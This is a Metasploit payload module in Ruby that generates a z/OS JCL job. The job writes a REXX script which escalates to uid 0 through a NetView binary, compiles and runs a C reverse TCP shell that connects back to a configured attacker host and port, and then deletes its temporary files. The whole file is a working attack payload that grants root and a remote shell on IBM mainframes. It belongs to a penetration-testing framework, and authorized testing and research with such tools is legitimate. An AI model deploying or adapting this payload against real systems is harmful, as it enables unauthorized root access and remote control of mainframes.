##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'z/OS JCL file to generate & compile reverse TCP shell',
			'Description'   => 'Reverse connect back z/OS OMVS shell',
			'Author'        => ['Soldier of Fortran', 'S_0xBA115',],
			'License'       => BSD_LICENSE,
			'Platform'      => 'zos',
			'Arch'          => ARCH_ZARCH,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# JCL Bind Shell
	#
	def jcl_reverse_shell
    if (!datastore['FTPUSER'] or datastore['FTPUSER'].empty?)
       # JCL requires a username to run the job (not always but usually)
       jcl_user = ''
       job_name = ''
       ip_addr = ''
       port = ''
    else
       jcl_user = datastore['FTPUSER']
       job_name = datastore['FTPUSER'] + Rex::Text.rand_text_alpha(1)
       ip_addr = datastore['LHOST']
       port = datastore['LPORT']
    end
    tmp_source = Rex::Text.rand_text_alpha(5)
    tmp_exec = Rex::Text.rand_text_alpha(5)
    tmp_rexx = Rex::Text.rand_text_alpha(5)
		shell = <<-END_OF_JCL_CODE
//#{job_name.upcase}      JOB (#{jcl_user.upcase}),'SOF',CLASS=A,MSGCLASS=0,MSGLEVEL=(1,1)
//CREATERX  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/#{tmp_rexx}'
//SYSUT1    DD DATA,DLM=##
/* REXX */
/* Modified from the Logica Breach investigation */
call syscalls('ON')
if __argv.2=='MSF4' then do
  address syscall 'setuid 0'
  address syscall 'getuid'
  myuid=retval
/*  say "uid is " myuid */
env.0=1
env.1='PATH=/bin:/sbin/usr/sbin:/usr/bin'
 call bpxwunix '/tmp/#{tmp_exec}',,,,env.
 exit
end
/* say 'l3tz g3t s0m3 0f d4t r00t!@#' */
parm.0=2
parm.1=__argv.1
parm.2='MSF4'
env.0=1
env.1='_BPC_SHAREAS=NO'
address syscall 'spawn /usr/lpp/netview/v5r3/bin/cnmeunix 0 . parm. env.'
address syscall 'wait wret.'
##
//CREATECS  EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD PATHOPTS=(ORDWR,OTRUNC,OCREAT),PATHMODE=SIRWXU,
//             PATHDISP=(KEEP,DELETE),
//             FILEDATA=TEXT,
//             PATH='/tmp/#{tmp_source}.c'
//SYSUT1    DD DATA,DLM=##
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
 int i , sockfd;
 struct sockaddr_in sin;
 printf("Setting up Vars\\n");
 sockfd = socket(AF_INET,SOCK_STREAM,0);
 sin.sin_family = AF_INET;
 sin.sin_addr.s_addr=inet_addr("#{ip_addr}");
 sin.sin_port=htons(#{port});
 printf("Connecting to #{ip_addr}:#{port}\\n");
 connect(sockfd,(struct sockaddr *)&sin,sizeof(struct sockaddr_in));
 dup2(sockfd,2);
 dup2(sockfd,1);
 dup2(sockfd,0);
 printf("Sending Shell\\n");
 execl("/bin/sh","sh",NULL);
return EXIT_SUCCESS;
}
##
//OMGLOL    EXEC PGM=BPXBATCH,REGION=800M
//*STDOUT    DD PATH='/tmp/mystd.out',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//*STDERR    DD PATH='/tmp/mystd.err',PATHOPTS=(OWRONLY,OCREAT),
//*             PATHMODE=SIRWXU
//*STDPARM   DD *
SH cd /tmp;
cc -o /tmp/#{tmp_exec} /tmp/#{tmp_source}.c;
chmod +x /tmp/#{tmp_rexx};
/tmp/#{tmp_rexx}
rm /tmp/#{tmp_exec}
rm /tmp/#{tmp_source}.c
rm /tmp/#{tmp_exec}
/*
END_OF_JCL_CODE

		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return super + jcl_reverse_shell 
	end

end
